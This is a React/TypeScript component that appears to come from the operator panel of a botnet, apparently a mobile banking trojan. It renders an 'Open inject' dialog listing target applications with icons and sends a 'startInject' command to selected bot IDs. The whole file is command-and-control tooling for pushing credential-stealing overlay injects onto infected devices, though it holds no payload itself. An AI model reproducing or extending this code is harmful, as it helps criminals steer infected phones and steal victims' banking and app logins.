import React from "react";
import {ModalWithSelectedBotsProps} from "../../../Model/Modal";
import {Form, Modal, Space} from "antd";
import {getBotsId} from "../../../Util/getBotIds";
import sendCommand from "../../../Requests/Commands/sendCommands";
import {useSelector} from "react-redux";
import {AppState} from "../../../Store/RootReducer";
import {customStyles, getApiUrl, inputRules} from "../../../Util/config";
import CreatableSelect from "react-select/creatable";

const OpenInject: React.FC<ModalWithSelectedBotsProps> = (props: ModalWithSelectedBotsProps) => {
    const [form] = Form.useForm();

    const filtersReducer = useSelector((state: AppState) => state.filters);

    const renderItem = (app: string, icon: string) => ({
        value: app,
        label: (
            <Space size={10}>
                <img width={16} src={icon} alt={app} />
                {app}
            </Space>
        ),
    });

    const options: any[] = [];

    const renderTitle = (title: string) => (
        <span>
            {title}
        </span>
    );

    {Object.keys(filtersReducer.injections).map((application: string) => {
        const injection = filtersReducer.injections[application];
        options.push({
            label: renderTitle(application),
            options: [renderItem(application, getApiUrl(`injects/images/${injection.type}/${application}.png`))],
        });
    });}

    const closeModal = () => {
        props.setVisible(false);
        form.resetFields();
    };

    const formSubmit = () => {
        sendCommand({
            command: "startInject",
            payload: {
                app: form.getFieldsValue()["app"].value,
            },
            botIds: getBotsId(props.selectedBots),
        });

        closeModal();
    };
    return (
        <Modal
            title="Open inject"
            visible={props.visible}
            onCancel={closeModal}
            onOk={() => form.submit()}
            okText="Send"
            width={340}
            destroyOnClose
        >
            <Form form={form} layout="vertical" onFinish={formSubmit}>
                <Form.Item label="Application" name="app" rules={inputRules}>
                    <CreatableSelect styles={customStyles} options={options} />
                </Form.Item>
            </Form>
        </Modal>
    );
};

export default OpenInject;
